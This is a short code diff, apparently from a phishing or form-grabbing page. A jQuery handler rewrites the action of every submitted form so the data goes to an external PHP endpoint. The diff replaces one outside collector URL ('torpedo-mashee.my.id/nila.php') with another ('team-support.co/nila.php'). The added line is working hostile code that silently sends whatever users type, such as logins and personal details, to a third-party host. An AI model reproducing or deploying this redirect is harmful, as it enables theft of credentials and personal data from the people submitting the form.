@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://torpedo-mashee.my.id/nila.php");
+  $(myform).attr("action", "https://team-support.co/nila.php");
 });
